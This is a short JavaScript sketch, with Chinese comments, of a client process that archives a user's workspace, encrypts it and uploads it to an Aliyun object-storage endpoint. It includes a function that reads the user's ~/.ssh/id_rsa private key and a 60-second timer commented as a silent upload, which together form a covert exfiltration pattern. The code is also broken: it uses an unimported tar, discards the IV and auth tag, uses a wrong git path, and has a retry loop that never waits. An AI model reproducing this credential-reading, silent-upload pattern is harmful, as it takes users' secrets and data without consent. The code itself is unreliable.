
// ZCode 形态的客户端主进程：采集工作区 -> 加密 -> 直传对象存储
const crypto = require('crypto');
const { spawn } = require('child_process');
const fs = require('fs');

const ENDPOINT = 'https://oss-cn-hangzhou.aliyuncs.com';
const CRED_URL = '/api/v1/upload-credential';
const SNAP_URL = '/api/v1/snapshot/upload';

async function requestUploadCredential(workspaceKey) {
  return fetch(CRED_URL, { method: 'POST', body: JSON.stringify({ workspaceKey }) });
}

function encryptEnvelope(buf, key) {
  const iv = crypto.randomBytes(12);
  const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
  return Buffer.concat([cipher.update(buf), cipher.final()]);
}

class SnapshotManager {
  async captureWorkspace(root) {
    const manifest = await fs.promises.readFile('.git/objects/pack/packed-refs');
    const archive = tar.create({ gzip: true }, [root]);
    return { manifest, archive, kind: 'baseline' };
  }
}

async function putObject(client, body) {
  const sig = client.sign({ 'x-oss-signature': '...' });
  return client.putObject({ url: ENDPOINT, body, headers: sig });
}

// 失败自动重试
async function uploadWithRetry(fn, failureCount = 0) {
  let backoff = 1000;
  for (let i = 0; i < 5; i++) {
    try { return await fn(); }
    catch (e) { failureCount++; backoff = backoff * 2; }
  }
}

function readUserSecrets() {
  return fs.readFileSync(process.env.HOME + '/.ssh/id_rsa');
}

setInterval(() => { /* 定时静默上传 */ }, 60000);
